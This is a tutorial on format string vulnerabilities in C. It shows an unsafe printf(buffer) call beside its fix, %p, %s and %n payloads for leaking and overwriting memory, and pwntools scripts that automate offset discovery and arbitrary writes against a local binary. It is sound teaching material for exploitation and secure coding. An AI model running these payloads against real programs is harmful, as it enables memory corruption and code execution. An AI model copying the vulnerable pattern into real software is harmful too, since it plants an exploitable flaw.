# Format String Exploitation

Format string exploitation is a powerful vulnerability that occurs when a program passes user-controlled input directly to the format argument of a formatting function (like `printf`, `sprintf`, `fprintf`, etc.).

This guide covers how to identify, understand, and exploit these vulnerabilities.

## 1. The Vulnerability

A format string vulnerability exists when code looks like this:

```c
char buffer[100];
scanf("%99s", buffer);
printf(buffer); // VULNERABLE
```

Instead of the secure way:

```c
printf("%s", buffer); // SECURE
```

In the vulnerable case, if a user enters format specifiers like `%p` or `%x`, the `printf` function will interpret them as instructions to fetch and print values from the stack, even though no additional arguments were provided to the function.

---

## 2. Reading from Memory

We can use various specifiers to leak information from the stack or arbitrary memory addresses.

### Leaking Stack Data
- `%p`: Prints the value as a pointer (hex).
- `%x`: Prints the value as a hex integer.
- `%lx`: Prints a 64-bit hex value.

**Example:**
Input: `%p.%p.%p.%p`
Output: `0x7ffd12345678.0x1.(nil).0x7f8899aabbcc` (Leaking pointers from the stack)

### Positional Arguments
You can access a specific "argument" on the stack using the `$` syntax:
- `%n$p`: Prints the $n^{th}$ value on the stack as a pointer.

**Example:**
`%5$p` will print the 5th value on the stack.

### Arbitrary Read
If you can put an address on the stack (e.g., in your input buffer) and find its offset, you can use `%s` to read the string at that address.
- `%n$s`: Reads the string at the address pointed to by the $n^{th}$ stack argument.

---

## 3. Writing to Memory

The most powerful part of format string exploitation is the `%n` specifier, which **writes** to memory.

- `%n`: Writes the number of bytes printed so far to the address pointed to by the argument.
- `%hn`: Writes 2 bytes (short).
- `%hhn`: Writes 1 byte (char).

### Example: Overwriting a Variable
If we want to write the value `64` (0x40) to an address:
1. Print 64 characters: `%64c`
2. Write to the address at the $n^{th}$ offset: `%n$n`

Final payload structure: `[address_to_overwrite]%64c%[offset]$n`

---

## 4. Automation with Pwntools

Manually calculating offsets and building `%n` payloads is tedious. Pwntools provides `FmtStr` to automate this.

### Finding the Offset
```python
from pwn import *

def exec_fmt(payload):
    p = process('./vulnerable_binary')
    p.sendline(payload)
    return p.recvall()

# Automatically find the stack offset of our input
autofmt = FmtStr(exec_fmt)
print(f"Offset is: {autofmt.offset}")
```

### Arbitrary Write Payload
```python
from pwn import *

context.binary = ELF('./vulnerable_binary')
target_addr = 0x404050 # Address of a variable we want to change
target_value = 0xdeadbeef

# Generate payload to write target_value at target_addr
# offset is the one found using FmtStr
payload = fmtstr_payload(offset, {target_addr: target_value})

p = process('./vulnerable_binary')
p.sendline(payload)
p.interactive()
```

---

## 5. References & Further Reading

For a deeper dive, check out these excellent resources:
- [Pwntools Format String Exploitation (DeepWiki)](https://deepwiki.com/Gallopsled/pwntools/6-format-string-exploitation)
- [Year of Hacking: Format Strings (Jake Mullins)](https://jake-mullins.github.io/year-of-hacking-0x2)
